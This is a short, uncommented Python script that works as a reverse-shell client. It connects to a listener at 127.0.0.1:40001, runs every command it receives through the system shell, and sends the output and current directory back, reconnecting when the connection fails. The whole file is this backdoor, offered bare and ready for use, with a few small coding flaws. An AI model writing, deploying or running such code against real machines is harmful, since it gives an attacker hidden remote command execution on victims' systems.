import subprocess,socket,os

s=socket.socket()

def connect_serv():
	try:
		s.connect(('127.0.0.1',40001))
	except:
		print("reconnecting!!")
		connect_serv()

connect_serv()
while True:
	message = ">>"
	data = s.recv(20480).decode("utf-8")
	try:
		if data.strip().startswith('cd '):
			new_path = data[3:].strip()
			if new_path:
				os.chdir(new_path)

				message = str.encode(f"Changed directory to: {os.getcwd()}")
			else:
				message = str.encode("Error: No directory specified")
	except OSError as e:
		message = str.encode(f"Error changing directory: {str(e)}")
	try:
		if len(data) > 0:
			cmd = subprocess.Popen(data,shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
			output_byte = cmd.stdout.read() + cmd.stderr.read()
			output_str = str(output_byte,"utf-8")
			currentWD = os.getcwd() + "> "

			message = str.encode(output_str + currentWD)

	except Exception as e:
		message = str.encode("Error executing command: " + str(e))
	finally:
		s.send(message)
